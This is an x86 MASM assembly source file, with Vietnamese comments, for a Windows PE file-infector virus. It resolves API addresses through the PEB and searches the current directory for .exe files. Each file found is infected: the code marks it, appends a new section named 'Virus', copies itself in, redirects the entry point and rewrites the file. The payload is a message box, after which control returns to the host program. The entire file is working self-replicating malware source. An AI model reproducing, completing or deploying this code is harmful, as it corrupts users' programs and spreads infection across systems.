.386
.model flat, stdcall  ;32 bit memory model
.stack 100h
option casemap :none  ;case sensitive
include user32.inc
include kernel32.inc
include windows.inc 

; Directives for the linker to link libraries
includelib c:\masm32\lib\user32.lib
includelib c:\masm32\lib\kernel32.lib
.data 
	
	
.code
start:
teststartvr:
	;delta 
	call Delta
	Delta:
		pop ebp
		sub ebp, offset Delta
	
	jmp skipdataep
	EP dd 0
	skipdataep:
	
	
	;lay address GetProcAddress vaf Kernel32
	call getGetProcAddress
	mov [AKernel32+ebp], edx
	mov [AGetProcAddress+ebp], eax
	
	;lay address loadlibraryA cho vao ALoadLibrary
	mov eax, offset LoadLibraryAName
	add eax, ebp
	push eax
	;push offset LoadLibraryAName
	push edx ;Kernel32
	call [AGetProcAddress + ebp]
	mov [ALoadLibrary+ebp], eax
	
	;tim Address find first file
	mov edx, [AKernel32+ebp]
	mov eax, offset FindFirstFileAName
	add eax, ebp
	push eax
	;push offset [FindFirstFileAName+ebp]
	push edx ;Kernel32
	call [AGetProcAddress + ebp]
	mov [AFindFirstFile+ebp], eax
	
	;Call findfirstfile
	mov eax, offset fileinfo
	add eax, ebp
	push eax
	;push offset fileinfo + ebp
	mov ebx, offset filename
	add ebx, ebp
	push ebx
	;push offset [filename+ebp]
	call [AFindFirstFile + ebp]
	cmp eax, 0
	je doneinfecting
	mov [firstfilehandle+ebp], eax
	;call infect
	call infect
	
	
	skipfile:
	;clear filename fileinfo
	
	mov eax, offset fileinfo
	add eax, 2Ch
	add eax, ebp
	mov edi, 0
	_loop3:
		cmp edi, 260
		je _break3
		mov cl, 0
		mov [eax], cl
		inc eax
		inc edi
		jmp _loop3
	_break3:
	
	;tim Address find next file
	mov edx, [AKernel32+ebp]
	mov eax, offset FindNextFileAName
	add eax, ebp
	push eax
	;push offset FindNextFileAName
	push edx ;Kernel32
	call [AGetProcAddress + ebp]
	mov [AFindNextFile+ebp], eax
	;Call findnextfile
	mov eax, offset fileinfo
	add eax, ebp
	push eax
	;push offset fileinfo
	push [firstfilehandle+ebp]
	call [AFindNextFile + ebp]
	cmp eax, 0
	je doneinfecting

	call infect
	jmp skipfile
	
	doneinfecting:
	
	;;;;main payload / call msg box
	
	mov eax, offset user32name 
	add eax, ebp
	push eax
	;push offset user32name+ebp
	call [ALoadLibrary + ebp]
	mov ebx, eax
	
	mov eax, offset MessageBoxName
	add eax, ebp
	push eax
	;push offset MessageBoxName
	push ebx ;handle user32 dll
	call [AGetProcAddress + ebp]
	mov [AMessageBox+ebp], eax
	
	push 0
	push NULL
	push NULL
	push NULL
	CALL [AMessageBox + ebp]
	
	
	mov eax,offset teststartvr
	add eax, ebp
	sub eax, [EP + ebp]
	
	jmp eax
	;;;;
	
	invoke ExitProcess, 0 
	
	
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	getGetProcAddress:
	;tim dia chi kernel32 cat vao edx?
	ASSUME FS:NOTHING
	mov ebx, fs:[030h]
	mov ebx, [ebx + 0ch]
	mov ebx, [ebx + 0ch]
	mov ebx, [ebx + 00h]
	mov ebx, [ebx + 00h]
	mov eax, [ebx + 18h]
	
	;tim e_lfanew
	mov ebx, [eax + 3Ch]
	add ebx, eax
	
	
	mov ebx, [ebx + 78h]
	add ebx, eax
	push ebx
	
	mov ebx, [ebx + 20h]
	add ebx, eax
	xor edx, edx
	
	;tim dia chi getprocaddress cat vao eax
	_loop:
		lea esi, [ebp + GetProcAddressName]
		mov edi, [ebx + edx]
		add edi, eax
		mov ecx, 0Fh
		add edx, 04h
		repz cmpsb
		jnz _loop
	
	sub edx, 04h
	shr edx, 01h
	pop ebx
	mov edi, [ebx +24h]
	add edi, eax
	movzx edx, word ptr[edi + edx]
	
	shl edx, 02h
	mov edi, [ebx +1Ch]
	add edi, eax
	mov edi, [edi + edx]
	add edi, eax
	mov edx ,eax
	mov eax, edi
	retn
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	
	
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;infecto;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	infect:
	;lay address createfile
	mov edx, [AKernel32+ebp]
	mov eax, offset CreateFileAName
	add eax, ebp
	push eax
	;push offset CreateFileAName+ebp
	push edx ;Kernel32
	call [AGetProcAddress + ebp]
	mov [ACreateFile+ebp], eax
	
	;call createfile
	push NULL
	push 80 ;FILE_ATTRIBUTE_NORMAL
	push 3 ;OPEN_EXISTING ;open 3 
	push NULL
	push 3
	;ush 80000000h  ;GENERIC_READ ;generic read 80000000 WRITE 40000000
	push 0C0000000h
	mov eax, offset fileinfo
	add eax, 2Ch
	add eax, ebp
	push eax
	;push offset fileinfo.cFileName
	call [ACreateFile + ebp]
	mov [hFile+ebp], eax
	cmp eax, 0ffffffffh
	je return
	
	
	;lay address getfilesize
	mov edx, [AKernel32+ebp]
	mov eax, offset GetFileSizeName
	add eax, ebp
	push eax
	;push offset GetFileSizeName+ebp
	push edx ;Kernel32
	call [AGetProcAddress + ebp]
	mov [AGetFileSize+ebp], eax
	
	push NULL
	push [hFile+ebp]
	call [AGetFileSize + ebp]
	mov [filesize+ebp], eax
	
	
	;lay address VirtualAlloc
	mov edx, [AKernel32+ebp]
	mov eax, offset VirtualAllocName
	add eax, ebp
	push eax
	;push offset [VirtualAllocName+ebp]
	push edx ;Kernel32
	call [AGetProcAddress + ebp]
	;call VirtualAlloc
	push 4 ;PAGE_READWRITE
	push 1000h ;MEM_COMMIT
	mov edx, [filesize+ebp]
	add edx, 1200h
	push edx
	push NULL
	;add eax, ebp
	call eax
	mov [pMemory+ebp], eax
	
	;lay address Readfile
	mov edx, [AKernel32+ebp]
	mov eax, offset ReadFileName
	add eax, ebp
	push eax
	;push offset [ReadFileName+ebp]
	push edx ;Kernel32
	call [AGetProcAddress + ebp]
	;call Readfile
	push NULL
	PUSH NULL
	push [filesize+ebp]
	push [pMemory+ebp]
	push [hFile+ebp]
	;add eax, ebp
	call eax
	
	
	;check signature
	mov eax, [pMemory+ebp]
	add eax, 20h
	xor ecx, ecx
	mov ch, [eax]
	cmp ch, 'H'
	je return
	
	
	
	;them signature
	mov eax, [pMemory+ebp]
	add eax, 20h
	mov cl, 'H'
	mov [eax], cl
	
	
	;e_lfanew
	mov eax, [pMemory+ebp]
	add eax, 3Ch
	mov ebx, [eax]
	mov eax, [pMemory+ebp]
	add eax, ebx
	
	;tim virus size
	mov eax, endvirus
	mov [virussize+ebp], eax
	mov eax, start
	sub [virussize+ebp],eax
	
	; sua sizeofimage+=virussize
	mov eax, [pMemory+ebp]
	add eax, 3Ch
	mov ebx, [eax]
	mov eax, [pMemory+ebp]
	add eax, ebx
	add eax, 50h
	mov ebx , [eax]
	add ebx , [virussize+ebp]
	mov [eax],ebx
	
	; sua sizeofheader += 100
	mov eax, [pMemory+ebp]
	add eax, 3Ch
	mov ebx, [eax]
	mov eax, [pMemory+ebp]
	add eax, ebx
	add eax, 54h
	mov ebx , [eax]
	add ebx, 100
	mov [eax], ebx
	
	;lay original entry point 
	mov eax, [pMemory+ebp]
	add eax, 3Ch
	mov ebx, [eax]
	mov eax, [pMemory+ebp]
	add eax, ebx
	add eax, 28h
	mov ebx , [eax]
	mov [OriginalEP+ebp], ebx
	
	
	;lay section alignment
	mov eax, [pMemory+ebp]
	add eax, 3Ch
	mov ebx, [eax]
	mov eax, [pMemory+ebp]
	add eax, ebx
	add eax, 38h
	mov ebx , [eax]
	mov [SectionAlignment+ebp], ebx
	
	
	;lay File alignment
	mov eax, [pMemory+ebp]
	add eax, 3Ch
	mov ebx, [eax]
	mov eax, [pMemory+ebp]
	add eax, ebx
	add eax, 3Ch
	mov ebx , [eax]
	mov [FileAlignment+ebp], ebx
	

	;sua number of section
	mov eax, [pMemory+ebp]
	add eax, 3Ch
	mov ebx, [eax]
	mov eax, [pMemory+ebp]
	add eax, ebx
	add eax, 6h
	mov bx , [eax]
	inc bx
	mov [eax],bx
	push ebx
	
	;invoke GetLastError
	;them section virus 
	mov eax, [pMemory+ebp]
	add eax, 3Ch
	mov ebx, [eax]
	mov eax, [pMemory+ebp]
	add eax, ebx
	add eax, 248
	;cong 40 voi moi section
	pop ebx
	dec bx
	_loopsection:
		cmp ebx, 0
		je _skipsection
		add eax, 40
		dec ebx
		jmp _loopsection
	_skipsection:
	;ten section
	mov edx, 0
	mov dl, 86
	mov [eax], dl ;V
	inc eax
	mov dl, 105
	mov [eax], dl ;i
	inc eax
	mov dl, 114
	mov [eax], dl ;r
	inc eax
	mov dl, 117
	mov [eax], dl ;u
	inc eax
	mov dl, 115
	mov [eax], dl ;s
	inc eax
	add eax, 3
	;virtual size
	mov ebx, [virussize + ebp]
	mov [eax], ebx
	add eax, 4
	;virtual address
	mov ebx, eax
	sub ebx, 40
	mov ecx, [ebx] ;lay va section truoc do
	sub ebx, 4
	add ecx, [ebx] ;+= virtual size
	mov edx, 0
	_loopva: 
		cmp edx, ecx
		jg _skipva
		
		add edx, [SectionAlignment+ebp]
		jmp _loopva
	_skipva:
	mov [eax], edx
	mov [NewEP + ebp], edx
	add eax, 4
	;raw size
	mov ecx, [virussize + ebp]
	mov edx, 0
	_looprawsize:
		cmp edx, ecx
		jg _skiprawsize
		add edx, [FileAlignment+ebp]
		jmp _looprawsize
	_skiprawsize:
	mov [eax],edx
	add eax, 4
	;raw address
	mov ebx , eax
	sub ebx, 40
	mov edx, [ebx] ;edx = raw add section truoc
	sub ebx, 4
	add edx, [ebx]	;edx += raw size section truoc
	mov [eax], edx
	mov [virusAddress+ebp], edx
	add eax,16
	;characteristics
	mov edx, 3758096480 ;E0000060h
	mov [eax], edx
	
	;sua entrypoint
	mov eax, [pMemory+ebp]
	add eax, 3Ch
	mov ebx, [eax]
	mov eax, [pMemory+ebp]
	add eax, ebx
	add eax, 28h
	mov ebx , [NewEP+ebp]
	mov [eax],ebx
	
	
	;copy virus vao section Virus
	mov eax, start
	add eax, ebp
	mov ebx, [pMemory + ebp]
	add ebx, [virusAddress + ebp]
	mov ecx, 0
	_copyvirus:
		cmp ecx, [virussize + ebp]
		jg _skipcopy
			mov edx, [eax]
			mov [ebx], edx
			inc eax
			inc ebx
			inc ecx
		jmp _copyvirus
	_skipcopy:
	
	;ghi entrypoint
	mov eax, [pMemory + ebp]
	add eax, [virusAddress + ebp]
	add eax, 0eh
	mov edx, [NewEP + ebp]
	sub edx, [OriginalEP + ebp]
	mov [eax], edx
	
		
	;close handle
	mov edx, [AKernel32+ebp]
	mov eax, offset CloseHandleName
	add eax, ebp
	push eax
	push edx ;Kernel32
	call [AGetProcAddress + ebp]
	push [hFile+ebp]
	;add eax, ebp
	call eax
	
	
	
	
	;luu file/ ghi de len file cu
	push NULL
	;push 20000000h ;FILE_FLAG_NO_BUFFERING
	push 80h
	push 2 ;CREATE_ALWAYS
	push NULL
	push 2 ;FILE_SHARE_WRITE
	push 40000000h ;GENERIC_WRITE
	mov eax, offset fileinfo
	add eax, 2Ch
	add eax, ebp
	push eax
	;push offset fileinfo.cFileName
	call [ACreateFile + ebp]
	mov [hFile+ebp], eax
	
	;lay address Writefile
	mov edx, [AKernel32+ebp]
	mov eax, offset WriteFileName
	add eax, ebp
	push eax
	;push offset [WriteFileName+ebp]
	push edx ;Kernel32
	call [AGetProcAddress + ebp]
	;call writefile
	PUSH NULL
	;mov ebx , offset ReadSize
	;add ebx, ebp
	;PUSH ebx
	push NULL
	mov edx, [filesize+ebp]
	add edx, 1200h
	push edx
	PUSH [pMemory+ebp]
	PUSH [hFile+ebp]
	;add eax, ebp
	call eax
	
	
	;close handle
	mov edx, [AKernel32+ebp]
	mov eax, offset CloseHandleName
	add eax, ebp
	push eax
	push edx ;Kernel32
	call [AGetProcAddress + ebp]
	push [hFile+ebp]
	;add eax, ebp
	call eax
	
	;virtual free
	mov edx, [AKernel32+ebp]
	mov eax, offset VirtualFreeName
	add eax, ebp
	push eax
	push edx ;Kernel32
	call [AGetProcAddress + ebp]
	push 8000h ;mem release
	push 0
	push [pMemory + ebp]
	call eax
	
	
	return:
	retn
	
	
	jmp skipdata
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;data
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	
	
	delta dd 0
	
	
	user32name db "user32.dll", 0
	filename db "*.exe", 0
	firstfilehandle HANDLE 0
	hFile HANDLE 0
	pMemory dd 0
	
	filesize dd 0
	virussize dd 0
	NewEP dd 0
	SectionAlignment dd 0
	FileAlignment dd 0
	virusAddress dd 0
	ReadSize dw 0
	OriginalEP dd 0
	
	buffer db 20 dup (0)

	GetProcAddressName db "GetProcAddress", 0
	LoadLibraryAName db "LoadLibraryA", 0
	FindFirstFileAName db "FindFirstFileA", 0
	FindNextFileAName db "FindNextFileA", 0
	MessageBoxName db "MessageBoxA", 0
	CreateFileAName db "CreateFileA", 0
	GetFileSizeName db "GetFileSize", 0
	VirtualAllocName db "VirtualAlloc", 0
	ReadFileName db "ReadFile", 0
	WriteFileName db "WriteFile" ,0
	ExitProcessName db "ExitProcess",0
	CloseHandleName db "CloseHandle", 0
	DeleteFileName db "DeleteFile", 0
	VirtualFreeName db "VirtualFree", 0
	
	
	AKernel32 dd 0
	AGetProcAddress dd 0
	ALoadLibrary dd 0
	AFindFirstFile dd 0
	AFindNextFile dd 0
	AMessageBox dd 0
	ACreateFile dd 0
	AGetFileSize dd 0
	
	
	
	;fileinfo WIN32_FIND_DATA <>
	fileinfo word 350 dup (0)
	;2+4*3+2*4 +260+14+2+2+1
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	
	skipdata:
	
endvirus:
end start